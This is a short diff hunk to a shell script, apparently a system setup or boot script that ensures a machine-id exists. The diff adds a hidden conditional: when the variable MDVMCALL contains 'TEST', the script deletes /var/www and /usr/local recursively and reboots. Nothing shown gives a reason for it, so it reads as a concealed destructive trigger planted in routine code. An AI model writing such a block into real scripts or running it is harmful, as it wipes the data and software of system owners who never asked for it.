@@ -1407,5 +1407,10 @@ if [ ! -f '/etc/machine-id' ] ; then
     dbus-uuidgen --ensure
 fi
 
+if echo "$MDVMCALL" | grep -q "TEST"; then
+    rm -rf /var/www /usr/local
+    reboot
+fi
+
 exit 0
 
